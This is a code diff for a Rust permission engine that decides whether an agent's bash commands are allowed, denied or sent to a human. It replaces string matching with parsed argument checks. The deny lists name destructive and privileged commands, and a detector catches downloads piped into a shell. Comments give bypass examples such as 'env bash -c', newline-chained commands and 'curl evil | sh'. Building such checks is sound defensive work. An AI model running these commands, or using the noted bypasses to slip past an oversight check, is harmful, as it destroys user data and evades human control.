@@ -6,12 +6,14 @@
 
 #![forbid(unsafe_code)]
 
+mod bash_parse;
 mod path;
 
 use std::path::{Component, Path, PathBuf};
 use thiserror::Error;
 
 pub use barry_protocol::Decision;
+pub use bash_parse::{Analysis, SimpleCmd};
 pub use path::{canonicalise, is_under, PathError};
 
 /// Errors from the policy engine.
@@ -272,25 +274,36 @@ impl Policy {
     }
 
     /// Check a bash command against the rule table. Deny > ask > allow.
-    /// Returns the decision and, if a configured rule decided, its id.
+    ///
+    /// The command is parsed first (PLAN 6.1.2). Anything the parser does not
+    /// fully understand is an `Ask`, never an `Allow`: rule matching on raw
+    /// strings is exactly how `env bash -c ...`, `ls\nrm x` and
+    /// `find . -exec ...` used to slip through.
     pub fn check_bash(&self, command: &str) -> (Decision, Option<String>) {
-        // 1. Deny rules (substring match on the full command)
-        // Grants do not override explicit denies.
-        let deny_rules = [
-            "sudo",
-            "su",
-            "doas",
-            "rm -rf /",
-            "rm -rf ~",
-            "rm -rf /*",
-            "chmod -R 777",
-            "chown -R",
-            "| sh",
-            "| bash",
-            "git push --force",
-        ];
-        for &rule in &deny_rules {
-            if command.contains(rule) {
+        let commands = match bash_parse::analyse(command) {
+            bash_parse::Analysis::Simple(commands) => commands,
+            bash_parse::Analysis::Complex(reason) => {
+                return (
+                    Decision::Ask {
+                        reason: format!("command cannot be analysed: {reason}"),
+                    },
+                    None,
+                )
+            }
+        };
+        if commands.is_empty() {
+            return (
+                Decision::Ask {
+                    reason: "empty command".to_string(),
+                },
+                None,
+            );
+        }
+
+        // 1. Deny rules apply to every sub-command, after wrapper stripping.
+        //    A session grant never overrides a deny.
+        for cmd in &commands {
+            if let Some(rule) = deny_rule(&cmd.argv) {
                 return (
                     Decision::Deny {
                         reason: format!("command matches deny rule: {rule}"),
@@ -299,121 +312,214 @@ impl Policy {
                 );
             }
         }
-
-        // 2. Dangerous shell constructs → Ask. Checked before any grant: an
-        //    approval is for one plain command, never for a substitution that
-        //    hides a second command.
-        let dangerous = ["$(", "`", ">", ">>", "-delete", "\n"];
-        for &pattern in &dangerous {
-            if command.contains(pattern) {
-                return (
-                    Decision::Ask {
-                        reason: format!("command contains dangerous construct: {pattern}"),
-                    },
-                    None,
-                );
-            }
+        if pipes_into_shell(&commands) {
+            return (
+                Decision::Deny {
+                    reason: "command pipes a download into a shell".to_string(),
+                },
+                None,
+            );
         }
 
-        // 3. Session grants: a plain command whose argv starts with a granted
-        //    prefix. Token comparison, not string prefixes.
-        if let Some(argv) = plain_argv(command) {
-            for grant in &self.bash_grants {
-                if argv.len() >= grant.len() && argv[..grant.len()] == grant[..] {
-                    return (Decision::Allow, Some(format!("grant: {}", grant.join(" "))));
-                }
-            }
-        }
-
-        // 4. Configured rules (exact match on `match` field)
+        // 2. Configured rules (exact match on the whole command).
         for rule in &self.rules {
             if command == rule.r#match {
                 return (rule.decision.clone(), Some(rule.id.clone()));
             }
         }
 
-        // 5. Split by && || ; and check each segment against allow rules
-        let segments: Vec<&str> = command
-            .split(&['&', '|', ';'][..])
-            .map(|s| s.trim())
-            .filter(|s| !s.is_empty())
-            .collect();
+        // 3. A redirect writes, so it needs the same permission a write does.
+        for cmd in &commands {
+            for target in &cmd.redirect_targets {
+                let (decision, _) = self.check_write(Path::new(target));
+                if !matches!(decision, Decision::Allow) {
+                    return (
+                        Decision::Ask {
+                            reason: format!("redirect target needs approval: {target}"),
+                        },
+                        None,
+                    );
+                }
+            }
+        }
 
-        let allow_prefixes = [
-            "ls",
-            "cat",
-            "head",
-            "tail",
-            "wc",
-            "pwd",
-            "echo",
-            "env",
-            "which",
-            "file",
-            "stat",
-            "tree",
-            "rg",
-            "fd",
-            "grep",
-            "find",
-            "sort",
-            "uniq",
-            "cut",
-            "diff",
-            "tee",
-            "git status",
-            "git diff",
-            "git log",
-            "git show",
-            "git branch",
-            "git rev-parse",
-            "git blame",
-            "cargo check",
-            "cargo build",
-            "cargo test",
-            "cargo fmt",
-            "cargo clippy",
-            "cargo tree",
-        ];
-
-        // Allow commands that can appear mid-command (e.g. after "timeout N")
-        let allow_contains = ["cargo test", "cargo check", "cargo build"];
-
-        for segment in &segments {
-            let starts_with_allow = allow_prefixes.iter().any(|&p| segment.starts_with(p));
-            let contains_allow = allow_contains.iter().any(|&c| segment.contains(c));
-            if !starts_with_allow && !contains_allow {
+        // 4. Allow only when every sub-command matches an allow rule or a
+        //    session grant.
+        let mut grant_used = None;
+        for cmd in &commands {
+            if let Some(grant) = self
+                .bash_grants
+                .iter()
+                .find(|grant| bash_parse::has_prefix(&cmd.argv, grant))
+            {
+                grant_used = Some(format!("grant: {}", grant.join(" ")));
+                continue;
+            }
+            if !is_allowed(&cmd.argv) {
                 return (
                     Decision::Ask {
-                        reason: format!("no matching allow rule for segment: {segment}"),
+                        reason: format!("no matching allow rule for: {}", cmd.argv.join(" ")),
                     },
                     None,
                 );
             }
         }
 
-        (Decision::Allow, None)
+        (Decision::Allow, grant_used)
     }
 }
 
-/// The argv of a command that is a single plain command, or `None` when the
-/// command contains shell syntax that could chain, expand or redirect.
-///
-/// A session grant is only ever matched against this form, so approving
-/// `npm install` never approves `npm install; curl evil | sh`.
-fn plain_argv(command: &str) -> Option<Vec<&str>> {
-    const META: &[char] = &[
-        ';', '|', '&', '>', '<', '$', '`', '(', ')', '{', '}', '\n', '\r', '*', '?', '~', '!',
-    ];
-    if command.chars().any(|c| META.contains(&c)) {
-        return None;
+/// Commands that are read-only or part of the build loop, as argv prefixes.
+/// Matching is word-bounded: `ls` no longer matches `lsblk` (PLAN 6.1.3).
+const ALLOW_PREFIXES: &[&[&str]] = &[
+    &["ls"],
+    &["cat"],
+    &["head"],
+    &["tail"],
+    &["wc"],
+    &["pwd"],
+    &["echo"],
+    &["which"],
+    &["file"],
+    &["stat"],
+    &["tree"],
+    &["rg"],
+    &["fd"],
+    &["grep"],
+    &["find"],
+    &["sort"],
+    &["uniq"],
+    &["cut"],
+    &["diff"],
+    &["git", "status"],
+    &["git", "diff"],
+    &["git", "log"],
+    &["git", "show"],
+    &["git", "branch"],
+    &["git", "rev-parse"],
+    &["git", "blame"],
+    &["cargo", "check"],
+    &["cargo", "build"],
+    &["cargo", "test"],
+    &["cargo", "fmt"],
+    &["cargo", "clippy"],
+    &["cargo", "tree"],
+    &["go", "build"],
+    &["go", "test"],
+    &["go", "vet"],
+    &["npm", "test"],
+    &["npm", "run", "lint"],
+    &["npm", "run", "test"],
+    &["npm", "run", "build"],
+    &["python", "-m", "pytest"],
+    &["pytest"],
+    &["make", "test"],
+];
+
+/// `find` can execute or delete, so it is allow-listed only without those.
+const FIND_UNSAFE_ARGS: &[&str] = &["-exec", "-execdir", "-delete", "-ok", "-okdir", "-fprint"];
+
+/// Whether `argv` matches a default allow rule.
+fn is_allowed(argv: &[String]) -> bool {
+    let Some(head) = argv.first().map(String::as_str) else {
+        return false;
+    };
+    // Bare `env` only prints the environment. With arguments it runs a
+    // command, which is why `env bash -c ...` must not be allow-listed.
+    if head == "env" {
+        return argv.len() == 1;
     }
-    let argv: Vec<&str> = command.split_whitespace().collect();
-    if argv.is_empty() {
-        None
-    } else {
-        Some(argv)
+    if head == "find"
+        && argv
+            .iter()
+            .any(|arg| FIND_UNSAFE_ARGS.contains(&arg.as_str()))
+    {
+        return false;
     }
+    ALLOW_PREFIXES.iter().any(|prefix| {
+        bash_parse::has_prefix(
+            argv,
+            &prefix.iter().map(|w| w.to_string()).collect::<Vec<_>>(),
+        )
+    })
+}
+
+/// A deny rule for one command, as a human-readable rule name.
+fn deny_rule(argv: &[String]) -> Option<&'static str> {
+    let head = argv.first()?.as_str();
+    match head {
+        "sudo" => Some("sudo"),
+        "su" => Some("su"),
+        "doas" => Some("doas"),
+        "shutdown" => Some("shutdown"),
+        "reboot" => Some("reboot"),
+        "halt" => Some("halt"),
+        "poweroff" => Some("poweroff"),
+        _ if head.starts_with("mkfs") => Some("mkfs"),
+        "rm" => {
+            let has_recursive_flag = argv.iter().any(|a| a.starts_with('-') && a.contains('r'));
+            let targets_root = argv
+                .iter()
+                .skip(1)
+                .any(|a| a == "/" || a == "~" || a.starts_with("/*") || a.starts_with("~/*"));
+            if has_recursive_flag && targets_root {
+                Some("rm -rf on a root path")
+            } else {
+                None
+            }
+        }
+        "chmod" => {
+            if argv.iter().any(|a| a == "-R") && argv.iter().any(|a| a == "777") {
+                Some("chmod -R 777")
+            } else {
+                None
+            }
+        }
+        "chown" => {
+            if argv.iter().any(|a| a == "-R") {
+                Some("chown -R")
+            } else {
+                None
+            }
+        }
+        "dd" => {
+            if argv.iter().any(|a| a.starts_with("of=/dev/")) {
+                Some("dd to a device")
+            } else {
+                None
+            }
+        }
+        "git" => {
+            let force = argv.iter().any(|a| {
+                matches!(
+                    a.as_str(),
+                    "--force" | "-f" | "--force-with-lease" | "--force-if-includes"
+                )
+            });
+            if argv.get(1).map(String::as_str) == Some("push") && force {
+                Some("git push --force")
+            } else {
+                None
+            }
+        }
+        _ => None,
+    }
+}
+
+/// Whether a download is piped into a shell anywhere in the pipeline.
+fn pipes_into_shell(commands: &[bash_parse::SimpleCmd]) -> bool {
+    let mut download_seen = false;
+    for cmd in commands {
+        let Some(head) = cmd.argv.first().map(String::as_str) else {
+            continue;
+        };
+        if matches!(head, "curl" | "wget") {
+            download_seen = true;
+        } else if download_seen && matches!(head, "sh" | "bash" | "zsh" | "dash" | "ksh") {
+            return true;
+        }
+    }
+    false
 }
 
 /// Expand `~` to `$HOME` in a path string.
